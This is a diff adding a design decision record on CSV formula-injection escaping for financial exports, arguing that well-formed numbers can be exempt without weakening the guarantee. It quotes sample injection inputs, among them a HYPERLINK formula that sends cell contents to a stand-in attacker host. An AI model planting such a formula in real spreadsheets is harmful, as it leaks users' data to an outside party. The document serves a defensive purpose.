@@ -460,6 +460,47 @@ arithmetic on money in JavaScript, and a unit test for the whole path.
 
 ---
 
+## ADR-016 — CSV formula escaping exempts well-formed numbers
+
+**Status:** Accepted
+**Affects:** Every export. Narrows SECURITY.md §9.6.
+
+**Decision.** A CSV cell beginning `=`, `+`, `-`, `@`, tab or carriage return is prefixed with
+an apostrophe, **unless the cell is a well-formed number**.
+
+**The problem.** SECURITY.md §9.6, written in Phase 00, says to escape any cell beginning with
+one of those characters. Applied literally in Phase 05, that escapes `-1450.00` — and every
+refund, every loss, every downward stock adjustment in a financial export arrives in the
+spreadsheet as TEXT. The column will not sum.
+
+**Alternatives.**
+
+1. *Escape everything, as written.* Faithful to the document and produces an export that does
+   not do the one thing an export exists for. The predictable outcome is not that users accept
+   it: it is that someone removes the escaping wholesale the first time a finance team
+   complains, and then nothing is escaped.
+2. *Escape only `=` and `@`.* Smaller rule, but `+1+1` and `-1+1` are both evaluated by Excel,
+   so it leaves a real hole.
+3. *Escape unless the cell parses as a number.* Chosen.
+
+**Reasoning.** The security property is that no exported cell can execute as a formula. A
+string that parses as a number cannot also be a formula, so exempting numbers removes nothing
+from the guarantee — it is narrower in wording and identical in effect. `-1450.00` is a
+number; `-1+1`, `-A1` and `-HYPERLINK("http://attacker/?d="&A1,"x")` are not, and all three
+are still escaped.
+
+**Cost accepted.** The rule now has a second clause, which is a place to be wrong. Controlled
+by putting it in ONE tested predicate — `CsvCell::isNumeric`, a single explicit pattern rather
+than `is_numeric`, whose acceptance of hexadecimal and leading whitespace would be exactly the
+kind of edge case that turns an exemption into a hole. The test suite asserts both halves: the
+formulas above are escaped, and negative money is not.
+
+**Revisit if** an export ever needs to carry a value that is numeric to a spreadsheet but not
+to this pattern — a locale using a comma as the decimal separator, for instance. The fix then
+is to widen the pattern deliberately, not to drop the check.
+
+---
+
 ## Open decisions
 
 These need an answer from the project owner before the phase that depends on them.
